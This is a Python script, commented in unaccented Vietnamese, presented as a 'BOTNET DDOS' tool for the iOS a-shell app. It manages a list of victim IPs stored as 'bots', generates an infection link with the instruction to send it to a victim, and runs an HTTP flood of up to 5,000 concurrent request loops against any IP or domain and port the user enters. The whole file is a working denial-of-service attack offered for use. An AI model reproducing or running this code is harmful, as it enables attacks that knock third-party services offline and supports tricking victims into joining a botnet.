# botnet_async.py - Botnet chay tren a-shell (iOS)
# Cai dat: pip install aiohttp
# Chay: python3 botnet_async.py

import asyncio
import aiohttp
import random
import time
import json
import os
from datetime import datetime

# File luu tru botnet
BOT_FILE = "bots.json"
TARGET_FILE = "target.txt"

class Botnet:
    def __init__(self):
        self.bots = []
        self.attack_active = False
        self.load_bots()
        
    def load_bots(self):
        if os.path.exists(BOT_FILE):
            try:
                with open(BOT_FILE, 'r') as f:
                    self.bots = json.load(f)
                print(f"[+] Da load {len(self.bots)} bot")
            except:
                self.bots = []
        else:
            self.bots = []
            
    def save_bots(self):
        with open(BOT_FILE, 'w') as f:
            json.dump(self.bots, f)
        print(f"[+] Da luu {len(self.bots)} bot")
        
    def add_bot(self, ip, device):
        bot = {
            "id": len(self.bots) + 1,
            "ip": ip,
            "device": device,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "online"
        }
        self.bots.append(bot)
        self.save_bots()
        return bot
        
    def remove_bot(self, bot_id):
        self.bots = [b for b in self.bots if b["id"] != bot_id]
        self.save_bots()
        
    def list_bots(self):
        if not self.bots:
            print("\n[!] Chua co bot nao")
            return
        print("\n" + "="*60)
        print("DANH SACH BOTNET")
        print("="*60)
        for bot in self.bots:
            print(f"  ID:{bot['id']} | IP:{bot['ip']} | {bot['device']} | {bot['time']}")
        print(f"\nTong: {len(self.bots)} bot")
        
    def gen_link(self):
        token = f"bot_{int(time.time())}_{random.randint(1000,9999)}"
        link = f"http://localhost:8080/install?token={token}"
        print(f"\n[+] LINK PHAT TAN BOTNET:")
        print(f"   {link}")
        print(f"\n[*] Copy link nay gui cho nan nhan")
        return link
        
    async def attack_worker(self, url, end_time):
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time and self.attack_active:
                try:
                    async with session.get(url, timeout=2) as resp:
                        pass
                except:
                    pass
                await asyncio.sleep(0.01)
                
    async def start_attack(self, target, port=80, duration=60, threads=500):
        if not self.bots:
            print("[!] Chua co bot! Hay them bot truoc")
            return
            
        url = f"http://{target}:{port}/?r={random.random()}"
        end_time = time.time() + duration
        
        print(f"\n[+] BAT DAU TAN CONG")
        print(f"   Target: {target}:{port}")
        print(f"   Thoi gian: {duration}s")
        print(f"   Luong: {threads}")
        print(f"   Bot: {len(self.bots)}")
        
        self.attack_active = True
        tasks = []
        
        for i in range(threads):
            tasks.append(asyncio.create_task(self.attack_worker(url, end_time)))
            
        start = time.time()
        count = 0
        
        while time.time() < end_time and self.attack_active:
            remain = int(end_time - time.time())
            print(f"\r[*] Dang tan cong... con {remain}s | Goi: {count}", end="")
            await asyncio.sleep(1)
            count += threads * 10
            
        self.attack_active = False
        for t in tasks:
            t.cancel()
            
        print(f"\n[+] KET THUC! Da gui ~{count} request")
        
    def show_menu(self):
        while True:
            print("\n" + "="*40)
            print("   BOTNET DDOS - a-shell")
            print("="*40)
            print(" 1. Tao link phat tan")
            print(" 2. Them bot thu cong")
            print(" 3. Xem danh sach bot")
            print(" 4. Xoa bot")
            print(" 5. TAN CONG DDOS")
            print(" 6. Luu bot")
            print(" 0. Thoat")
            print("="*40)
            
            choice = input("\n[>] Chon: ").strip()
            
            if choice == "1":
                self.gen_link()
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "2":
                ip = input("  Nhap IP nan nhan: ").strip()
                device = input("  Nhap thiet bi (iPhone/Samsung/PC): ").strip()
                if ip:
                    self.add_bot(ip, device or "Unknown")
                    print(f"[+] Da them bot: {ip}")
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "3":
                self.list_bots()
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "4":
                self.list_bots()
                if self.bots:
                    try:
                        bot_id = int(input("  Nhap ID bot can xoa: ").strip())
                        self.remove_bot(bot_id)
                        print(f"[+] Da xoa bot ID {bot_id}")
                    except:
                        print("[!] ID khong hop le")
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "5":
                target = input("  Nhap IP hoac domain: ").strip()
                if not target:
                    print("[!] Chua nhap target")
                    continue
                try:
                    port = int(input("  Nhap cong (80/443): ").strip() or "80")
                    duration = int(input("  Thoi gian (giay): ").strip() or "30")
                    threads = int(input("  So luong (100-5000): ").strip() or "500")
                except:
                    port, duration, threads = 80, 30, 500
                    
                asyncio.run(self.start_attack(target, port, duration, threads))
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "6":
                self.save_bots()
                input("\n[*] Enter de tiep tuc...")
                
            elif choice == "0":
                self.save_bots()
                print("\n[+] Thoat botnet")
                break
                
            else:
                print("[!] Chon sai")

# Tao bot mau
def create_demo():
    botnet = Botnet()
    if len(botnet.bots) == 0:
        botnet.add_bot("192.168.1.100", "iPhone 14")
        botnet.add_bot("192.168.1.101", "Samsung S23")
    return botnet

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════╗
    ║   BOTNET DDOS - a-shell   ║
    ║   Python 3.x              ║
    ╚═══════════════════════════╝
    """)
    
    botnet = create_demo()
    botnet.show_menu()
